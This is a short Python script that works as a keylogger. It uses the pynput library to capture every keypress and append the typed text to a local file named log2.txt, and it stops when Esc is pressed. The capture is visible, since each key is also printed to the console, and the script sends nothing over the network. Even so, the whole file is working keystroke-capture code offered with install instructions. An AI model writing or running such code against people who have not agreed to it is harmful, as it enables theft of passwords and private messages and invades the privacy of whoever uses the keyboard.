from pynput.keyboard import Key, Listener
from datetime import datetime as dt

# in order to use the script:
# go to command line and write pip install pynput and press enter
count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print('{0} pressed'.format(key))
    print(dt.now())
    if count >= 20:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log2.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") >= 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
